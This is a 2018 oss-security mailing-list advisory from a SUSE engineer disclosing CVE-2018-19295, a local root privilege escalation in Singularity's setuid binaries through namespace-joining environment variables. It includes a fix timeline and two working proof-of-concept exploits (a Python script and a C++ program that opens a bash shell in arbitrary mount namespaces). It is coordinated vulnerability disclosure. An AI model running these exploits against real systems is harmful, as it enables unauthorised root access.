X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["16994" "Wednesday" "12" "December" "2018" "14:36:39" "+0100" "Matthias Gerstner" "mgerstner@suse.de" "<20181212133639.GA8474@f195.suse.de>" "496" "[oss-security] Singularity: CVE-2018-19295: local root exploit - unprivileged users can join arbitrary mnt, net, pid and ipc namespaces" nil nil nil "12" "2018121213:36:39" "[oss-security] Singularity: CVE-2018-19295: local root exploit - unprivileged users can join arbitrary mnt, net, pid and ipc namespaces" (number mark "U       mgerstner@su Dec 12  496/16994 " thread-indent "\"[oss-security] Singularity: CVE-2018-19295: local root exploit - unprivileged users can join arbitrary mnt, net, pid and ipc namespaces\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22128 invoked by uid 550); 12 Dec 2018 13:36:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22110 invoked from network); 12 Dec 2018 13:36:51 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Wed, 12 Dec 2018 14:36:39 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20181212133639.GA8474@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="GpGaEY17fSl8rd50"
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
Subject: [oss-security] Singularity: CVE-2018-19295: local root exploit - unprivileged users
 can join arbitrary mnt, net, pid and ipc namespaces

--GpGaEY17fSl8rd50
Content-Type: multipart/mixed; boundary="HG+GLK89HZ1zG0kk"
Content-Disposition: inline


--HG+GLK89HZ1zG0kk
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello,

following is a report about security issues found in Singularity [1].

Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Singularity is a Linux namespace based container solution often used
in HPC (high performance computing) environments. In the course of a
code review [4] conducted for inclusion of Singularity version 2.6.0 in
SUSE enterprise products I found a couple of security issues.

According to upstream this affects Singularity versions 2.4.0 through
2.6.0. A security bugfix release 2.6.1 has been published to address the
issues [2]. Please note that starting with major version 3.0.0
Singularity consists of a complete rewrite in the Go programming
language that is not affected by these issues.

Issue Details
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Singularity ships a couple of setuid root enabled binaries for setting
up the container environment for unprivileged users. These binaries are
where the security issues are originating. Note that on SUSE
distributions by default only members of the singularity group can
access these setuid root binaries. Following is my initial report
describing the security issues based on version 2.6.0.

A) One issue is found in mount-setuid in `src/mount.c:75` where
`singularity_runtime_ns(SR_NS_MNT)` is called. This function interprets
an environment variable `SINGULARITY_DAEMON_JOIN`. If it is set then
`_singularity_runtime_ns_mnt_join()` is called which in turn evaluates
the environment variable `SINGULARITY_NS_FD`. This environment variable
is supposed to specify the number of an inherited file descriptor that
refers to some `/proc/<pid>/ns` directory. The function then calls with
effective uid 0 `openat(ns_fd, "mnt", O_RDONLY);` to open the mount
namespace file descriptor and later on joins it via `setns()`.

This logic causes the following security issues:

1) A regular user can use it to join more or less arbitrary mount
  namespaces in the system. The `/proc/<pid>/ns` directories have mode
  0511 which allows any user to open a file descriptor for it when
  specifying the `O_PATH` open flag. Joining other users' mount
  namespaces is normally not possible for regular users as is stated in
  the `man 2 setns` man page:

  ```Changing the mount namespace requires that the caller possess both
  CAP_SYS_CHROOT and CAP_SYS_ADMIN capabilities in its own user
  namespace and CAP_SYS_ADMIN in the target mount namespace.```

  This can therefore also be used to cause the image mount in
  /var/singularity/mnt/final to occur in the root mount namespace and
  therefore make it visible to other processes in the root namespace of
  the system. By using the directory container format arbitrary
  user-reachable directories can be bind-mounted to
  /var/singularity/mnt/final. (which, by itself, is probably not
  security relevant).
2) The logic can also be exploited to test for existence of arbitrary
  paths, by passing an FD refering to a user controlled directory that
  contains a symlink `mnt` to e.g. /root/.bash_history. The mount-setuid
  logging will show either EINVAL or ENOENT depending on whether the file
  exists.
3) The same approach as in 2) can be used to cause an arbitrary file to
  be opened by root, which could have side-effects depending on file
  system or device files etc.
4) When causing mount-suid to join the root mount namespace this way,
  the mount of the image specified via the `SINGULARITY_IMAGE`
  environment variable is persistent and not unmounted. When specifying a
  system directory like /usr/bin in `SINGULARITY_IMAGE` then a bind
  mount of /usr/bin will be performed in /var/singularity/mnt/final. A
  following mount of an actual file based image will cause the image
  contents to be bind-mounted on top of /var/singularity/mnt/final, and
  therefore become visible in /usr/bin. This can be considered a local
  root exploit, since user controlled files can be put in system path
  locations.

Regarding 1) and 4) you can find a PoC program attached (attach_ns.cpp).
Instructions on how to use it are found inside the source file comments.

B) Another similar issue is found in the start-suid program in
`src/start.c:97` where `singularity_runtime_ns(SR_NS_ALL)` is called.
This allows a regular user to join more or less arbitrary mnt, net, pid
and ipc namespaces. The same defects as listed in A) apply here.

The attached PoC program (join_ns.py) demonstrates how to join selected
namespaces by exploiting this issue.

C) The third setuid program, action-suid does apparently not directly
suffer from the issue above, because before `singularity_runtime_ns()`
is called, the function `singularity_daemon_init()` is called which in
join mode opens a `DAEMON_NS_FD` on its own and overrides the user
supplied one. However, the `daemon_init_join()` function which is
responsible for doing so checks whether /proc/<pid>/ns of the target
process is owned by the calling user. After that `open()` is called on
/proc/<pid>/ns. This approach is still subject to a race condition,
because the calling user could try to just in time replace this PID by a
different process that runs in namespaces not normally accessible to
him.

In the code it is a bit confusing that the following check and ERROR
message is found in various places:

```
if ( singularity_registry_get("DAEMON_JOIN") ) {
        singularity_message(ERROR, "Internal Error - This function should n=
ot be called when joining an instance\n");
    }
```

The execution is not aborted, however.

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2018-11-09: I privately reported the issues described above to the
Singularity project lead.

2018-11-12: Upstream opened an internal issue for it and confirmed the
issue in the following days. They started handling the issue according
to their own security protocol [3].

2018-11-21: Upstream communicated CVE-2018-19295 to me for these issues.

2018-11-30: Upstream provided patches to their PRO customers.

2018-12-11: Upstream released security bugfix release 2.6.1.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://www.sylabs.io/
[2]: https://github.com/sylabs/singularity/releases/tag/2.6.1
[3]: https://www.sylabs.io/2018/06/sylabs-security-vulnerability-protocol
[4]: https://bugzilla.suse.com/show_bug.cgi?id=3D1111411

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Linux GmbH
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--HG+GLK89HZ1zG0kk
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="join_ns.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python2

# Matthias Gerstner (SUSE Linux GmbH)
# mgerstner@suse.de
#
# Proof of Concept that shows that the singularity version 2.6.0 start-suid
# program allows regular users to join arbitrary ipc, mnt, net and pid
# namespaces.
#
# The key to this is using the DAEMON_JOIN=3D1 and DAEMON_NS_FD=3D<FD> envi=
ronment
# variables. The latter refers to a directory in which the ipc, mnt, net and
# pid files refering to namespaces are expected. openat() with effective ui=
d 0
# is used on them, symlinks are followed and setns() is called on them in t=
he
# end, leading to the final "container" process to reside in arbitrary
# namespaces.
#
# This PoC first builds a new image that contains a startscript that writes
# namespace related information into a directory in $HOME/nslogs.  Therefore
# the PoC only works if the home directory of the caller is mapped in the
# target mount namespace.
#
# A regular daemon instance of the container image is first started that ru=
ns
# "sleep 1d" as a "daemon". Then a second start-suid is issued with the
# manipulated environment variables. The startscript will be run and the
# namespace log information is written once more to ~/nslogs.
#
# By passing e.g. /proc/1/ns as a parameter, the PoC will attach to
# init's (systemd's) namespaces and show its network, process IPC, PID and
# mount information.
#
# You can also arbitrarily mix namespaces by creating a user controlled
# directory and place symlinks in it:
#
# $ mkdir ~/myns
# $ cd ~/myns
# $ ln -s /proc/1/ns/ipc
# $ ln -s /proc/2/ns/net
# $ ln -s /proc/3/ns/pid
# $ ln -s /proc/4/ns/mnt
# $ ~/join_ns.py ~/myns

from __future__ import print_function
import subprocess
import os, sys
import socket
import argparse
import fcntl

workdir =3D os.path.expanduser("~/singularity")
instance_name =3D "ubuntu1"
image_base =3D "ubuntu"
image_def =3D "{}.def".format(image_base)
image_file =3D "{}.img".format(image_base)
null =3D open("/dev/null", 'w')

parser =3D argparse.ArgumentParser(
    description =3D "Proof of concept showing that we can join arbitrary na=
mespaces via singularity setuid binaries"
)

parser.add_argument("PATH", help =3D "Path to the /proc/<PID>/ns directory =
to use for joining namespaces")

args =3D parser.parse_args()

def buildImage():

    with open('ubuntu.def', 'w') as def_fd:
        def_fd.write(
"""
Bootstrap: docker
From: ubuntu:16.04
Includecmd: no

%startscript
  # write namespace related information to files in $HOME
  /bin/mkdir ~/nslogs
  /bin/ps ax >~/nslogs/ps.log
  /usr/bin/ipcs >~/nslogs/ipc.log
  /bin/cat /proc/mounts >~/nslogs/mount.log
  /bin/ls -l /sys/class/net >~/nslogs/net.log
  # this is the "daemon", just sleeping for a day
  /bin/bash -c "sleep 1d"
""")

    print("Building example image. This requires root privs.\n\n")
    subprocess.check_call( ["sudo", "singularity", "build", "ubuntu.img", "=
ubuntu.def"],
        close_fds =3D True, shell =3D False )
    print("\n\n")

def startInstance(name):
    res =3D subprocess.call(["singularity", "instance", "list", name], stdo=
ut =3D null)
    if res =3D=3D 0:
        print("Singularity Instance {} is already running. Should I reuse i=
t?".format(name))
        while True:
            print("(y/n)? > ", end =3D '')
            sys.stdout.flush()
            answer =3D sys.stdin.readline().strip()
            if answer not in ("y", "n"):
                continue

            if answer =3D=3D "n":
                sys.exit(1)

            return

    subprocess.check_call(["singularity", "instance.start", image_file, nam=
e], close_fds =3D True)
    print("Started instance", name)

def getDaemonName(daemon_file):
    daemon_pid =3D None

    with open(daemon_file, 'r') as df_fd:
        for line in df_fd.readlines():
            var, val =3D line.strip().split('=3D', 1)
            if var =3D=3D "DAEMON_PID":
                daemon_pid =3D int(val)
                break

    if not daemon_pid:
        print("Failed to determine background daemon PID", file =3D sys.std=
err)
        sys.exit(1)

    with open("/proc/{}/cmdline".format(daemon_pid), 'r') as cmdline_fd:
        daemon_name =3D cmdline_fd.read().split('\0')[0]

    # when running start-suid directly then we need to replace it's argv[0]=
 by
    # this name for 'singularity instance list' to recognize it.
    return daemon_name

if not "O_PATH" in dir(os):
    # is only found in python >=3D 3.4
    os.O_PATH =3D 0x200000

if not os.path.isdir(workdir):
    os.makedirs( workdir )
os.chdir( workdir )

if not os.path.exists(image_file):
    buildImage()

ns_fd =3D os.open(args.PATH, os.O_PATH|os.O_RDONLY)
# starting from python 3.4 file descriptors are by default not inheritable
# NOTE: there's some bug in this new logic it seems, it can't set
# the ns_fd as inheritable. Using fcntl doesn't work and os.set_inheritable=
()
# tries to use ioctl() on it which returns EBADF.
# Therefore using python2 for this PoC.
fcntl.fcntl(ns_fd, 0)

startInstance(instance_name)

daemon_file =3D os.path.expanduser("~/.singularity/daemon/{}/{}".format(soc=
ket.gethostname(), instance_name))

if not os.path.exists(daemon_file):
    print("Failed to find daemon file in ", daemon_file, file =3D sys.stder=
r)
    sys.exit(1)

envvars =3D {
    "DAEMON_NAME": instance_name,
    "DAEMON_FILE": daemon_file,
    "IMAGE": image_file,
    "DAEMON_JOIN": "1",
    # needs to be set, otherwise start-suid segfaults
    "DAEMON_FD": "100",
    "DAEMON_NS_FD": str(ns_fd),
}

for var, val in envvars.items():
    os.environ["SINGULARITY_{}".format(var)] =3D val

# this should now run the startscript in the namespaces refered to by PATH,
# creating log files in ~/nslogs showing the namespace contents.

res =3D subprocess.call(
    [ "/usr/lib/singularity/bin/start-suid" ],
    # we need to inherit the DAEMON_NS_FD!
    close_fds =3D False
)

--HG+GLK89HZ1zG0kk
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="attach_ns.cpp"

/*
 * Matthias Gerstner (SUSE Linux GmbH)
 * mgerstner@suse.de
 *
 * Proof of Concept that shows that the singularity version 2.6.0 mount-suid
 * program allows regular users to join arbitrary mount namespaces.
 *
 * Usage example:
 *
 * $ g++ -oattach_ns attach_ns.cpp
 * $ export SINGULARITY_IMAGE=/path/to/some.simg
 * $ ./attach_ns /proc/$$/ns
 *
 * This will try to open a bash shell attached to the mount namespace of the
 * caller, thereby mounting `some.simg` into the root mount namespace into
 * /var/singularity/mnt/final.
 *
 * You can also determine processes that live in separate mount namespaces by
 * calling `lsns -t mnt` as root:
 *
 * # lsns -t mnt
 *          NS TYPE NPROCS   PID USER   COMMAND
 *  4026531840 mnt     123     1 root   /usr/lib/systemd/systemd --switched-root --system --deserialize 33
 *  4026531860 mnt       1    29 root   kdevtmpfs
 *  4026532197 mnt       1   432 root   /usr/lib/systemd/systemd-udevd
 *  4026532255 mnt       1   773 chrony /usr/sbin/chronyd
 *  4026532256 mnt       1   922 root   /usr/sbin/spice-vdagentd
 *  4026532257 mnt       3  1021 root   /usr/sbin/NetworkManager --no-daemon
 *
 * Then as the singularity user:
 *
 * $ ./attach_ns /proc/773/ns
 *
 * This would open a bash shell attached to the mount namespace that chronyd
 * lives in.
 *
 * By exploiting this mount namespace privilege escalation we can also mount
 * images in any system directory that is accessible to the singularity user.
 * For this we claim to mount a directory based image:
 *
 * $ export SINGULARITY_IMAGE=/usr/local
 * $ ./attach_ns /proc/$$/ns
 *
 * This will create a bind mount of /usr/local in /var/singularity/mnt/final
 * in the root mount namespace. This will never be unmounted.
 *
 * Now let's mount a file based image:
 *
 * $ export SINGULARITY_IMAGE=/path/to/some.simg
 * $ ./attach_ns /proc/$$/ns
 *
 * The image contents should now be visible in /usr/local. This is pretty much
 * a local root exploit, since we can replace system binaries and
 * configuration files by user controlled files.
 */

#include <iostream>
#include <sstream>

#include <string.h>
#include <errno.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>

int main(const int argc, const char **argv)
{
	if( argc != 2 )
	{
		std::cerr << "Expected path to DAEMON_NS_FD directory as parameter" << std::endl;
		return 1;
	}

	int ns_fd = open(argv[1], O_PATH|O_RDONLY);

	if( ns_fd == -1 )
	{
		std::cerr << "opening " << argv[1] << ": " << strerror(errno) << std::endl;
		return 1;
	}

	std::stringstream ss;
	ss << ns_fd;

	if( setenv("SINGULARITY_DAEMON_JOIN", "1", 1) != 0 ||
			setenv("SINGULARITY_DAEMON_NS_FD", ss.str().c_str(), 1) != 0 )
	{
		std::cerr << "failed to setenv(): " << strerror(errno) << std::endl;
		close (ns_fd);
		return 1;
	}

	const char *args[] = {
		"/usr/lib/singularity/bin/mount-suid",
		"/bin/bash",
		nullptr
	};

	execve(args[0], const_cast<char* const*>(args), environ);

	std::cerr << "failed to execve(): " << strerror(errno) << std::endl;

	close(ns_fd);

	return 0;
}

--HG+GLK89HZ1zG0kk--

--GpGaEY17fSl8rd50
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAlwRDucACgkQFMQFyXGS
NVOcJA//Qy++e4MZVANgjsIveVtfQLuiwxsKgCgyj3/gHw8AnRfOvOz0I8FtSjIP
v5is3andDEzvjLw2WYKXwjQEl1i/jXlWqXugrImyRbydgZDyv4r8q9FzbZu6I8cf
KJCPnn3GdBZCTWAE59vMB9opFrmLON5S6oNvO0ghwCb3ugR4RUdQM69MfncjGZA4
M4zF201f6lMKkXzSR9L/3822zmFe366gDN3C/hyd0f4pW9oHjTEaFV6p3qGj2gsG
ap7nS3iZAsiZRrkPPpaASLeEQlSnMK30NWTBmVsDNo7NQKOaPESMFEsgN54l2/A2
cP5lFrTv7oW1h3Pu7IddMDTOlxj3WFyAXkitIudIPt1igRRJlgFhOGsurpNUqEgZ
l7Kcaec+/Vjp4F9svSyL47QomgQi1qCKInOCQuDC2ZB8+lL4y1OGrpdDO4J9vuaU
FgO1Snktw9AuLZJFG+kq74mdPZwe3o6D9vo2+2eu17zL19lafwD2H0fsO8W3pz7o
s2KRYMQfLrmRh2aFsOU34E++CTA7Mh4Vwm0oTBWrsZ7yiU4gx4gEPLgpiAjnTrCo
WKeYfSoukWC8QN8gFjkU+0swcfKDdMKHfi9LNtfKbQT+rTtpWIzHbLRuvrDxxelB
EFtQlK+zaMV/eaLN39xL2pCRTtQKiISxB2MBMUX1yf6hlIxBczQ=
=llWb
-----END PGP SIGNATURE-----

--GpGaEY17fSl8rd50--
